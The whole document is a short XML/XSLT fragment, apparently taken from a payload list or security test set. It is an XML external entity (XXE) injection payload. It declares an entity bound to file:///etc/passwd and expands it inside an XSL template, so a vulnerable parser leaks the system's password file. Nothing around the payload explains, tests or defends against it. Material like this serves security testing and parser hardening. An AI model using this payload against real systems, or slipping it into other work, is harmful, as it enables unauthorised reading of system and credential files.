<!DOCTYPE xsl:stylesheet [
<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
<xsl:template match="/">
&passwd;
</xsl:template>